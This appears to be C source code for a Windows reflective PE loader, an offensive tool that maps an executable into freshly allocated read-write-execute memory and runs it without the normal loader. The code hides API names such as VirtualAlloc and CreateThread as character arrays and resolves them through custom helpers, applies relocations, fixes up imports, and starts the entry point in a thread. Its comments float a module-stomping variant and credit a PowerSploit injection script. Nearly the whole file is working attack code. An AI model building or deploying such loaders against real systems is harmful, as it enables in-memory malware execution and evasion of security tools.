#include "ReflectiveLoader.h"

ULONG_PTR WINAPI reflectiveLoader(DWORD_PTR baseAddr)
{
	WCHAR strK32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0x0 };
	char strReadProcessMemory[] = { 'R','e','a','d','P','r','o','c','e','s','s','M','e','m','o','r','y',0x0};
	char strCreateThread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d',0x0 };
	char strVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0x0 };
	char strWaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0x0 };


	t_ReadProcessMemory pReadProcessMemory = (t_ReadProcessMemory)hlpGetProcAddress(hlpGetModuleHandle(strK32dll), strReadProcessMemory);
	t_CreateThread pCreateThread = (t_CreateThread)hlpGetProcAddress(hlpGetModuleHandle(strK32dll), strCreateThread);
	t_VirtualAlloc pVirtualAlloc = (t_VirtualAlloc)hlpGetProcAddress(hlpGetModuleHandle(strK32dll), strVirtualAlloc);
	t_WaitForSingleObject pWaitForSingleOjbect = (t_WaitForSingleObject)hlpGetProcAddress(hlpGetModuleHandle(strK32dll), strWaitForSingleObject);

	SIZE_T imageSize = getImageSize(baseAddr);

	//allocate new memory space for the DLL. gonna try to allocate memory using module stopming and mapping out the DLL ontop of another DLL. Not sure if this will work or not.
	//allocate ptr to the newly allocated dll base.
	DWORD_PTR peBase = NULL;
	//create space by loading a DLL to write over return pointer by dllBase. (return statemetn would only return the first half of the RAX register (eax).
	//if (!InjectSCModuleStomp(baseAddr, imageSize, &peBase))
	//	exit(-2);
	peBase = pVirtualAlloc(NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	

	//calculate delta between the rebased PE and the image base listed in the option header.
	DWORD_PTR delta = (DWORD_PTR)peBase - (DWORD_PTR)((PIMAGE_NT_HEADERS)((DWORD_PTR)baseAddr + ((PIMAGE_DOS_HEADER)baseAddr)->e_lfanew))->OptionalHeader.ImageBase;
	
	//obtain pointer to the ntHeaders for easier use w/o having to do the crazy ony liner above ^
	PIMAGE_NT_HEADERS ntHeaders = getNtHeaders(baseAddr);
	//copy over the headers of our targeted PE. into the windows storage DLL.
	memcpy(peBase, baseAddr, ntHeaders->OptionalHeader.SizeOfHeaders);

	//obtain pointer to first section of our target PE
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	//map the sections over into the windows storage DLL.
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)peBase + (DWORD_PTR)section->VirtualAddress);
		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)baseAddr + (DWORD_PTR)section->PointerToRawData);
		//printf("Copying Section from Source 0x%lp\nto Destination 0x%lp\n", sectionBytes, sectionDestination);
		memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
		section++;
	}

	//perform image base relocations.
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)peBase;
	DWORD relocationsProcessed = 0;

	while (relocationsProcessed < relocations.Size) {
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

		for (DWORD i = 0; i < relocationsCount; i++) {
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

			if (relocationEntries[i].Type == 0)
				continue;

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			pReadProcessMemory(-1, (LPCVOID)((DWORD_PTR)peBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			addressToPatch += delta;
			memcpy((PVOID)((DWORD_PTR)peBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
		}
	}

	//resolve the import address table.
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)peBase);
	char libName[50] = { 0 };
	HMODULE lib = NULL;
	while (importDescriptor->Name != NULL) {
		WCHAR tmpLibName[50] = { 0 };
		memcpy(libName, importDescriptor->Name + (DWORD_PTR)peBase, strlen((LPVOID)(importDescriptor->Name + (DWORD_PTR)peBase)));
		size_t numCharsConvertered = NULL;
		size_t libNameSize = strlen(libName) + 1;
		mbstowcs_s(&numCharsConvertered, tmpLibName, libNameSize, libName, libNameSize);

		lib = customLoadLibrary(tmpLibName);

		if (lib) {
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)peBase + importDescriptor->FirstThunk);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)hlpGetProcAddress(lib, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)peBase + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)hlpGetProcAddress(lib, functionName->Name);
					thunk->u1.Function = functionAddress;
				}
				++thunk;
			}
		}
		importDescriptor++;
	}

	// execute the loaded PE
	//https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
	//used this script to figure out how to call the main function in a thread. CNTRL + F for 'PEInfo.FileType -ieq "EXE"'
	DWORD_PTR peMainPtr = (DWORD_PTR)peBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;

	HANDLE hThread = NULL;
	hThread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)peMainPtr, 0, 0, 0);
	pWaitForSingleOjbect(hThread, -1);

	return NULL;
}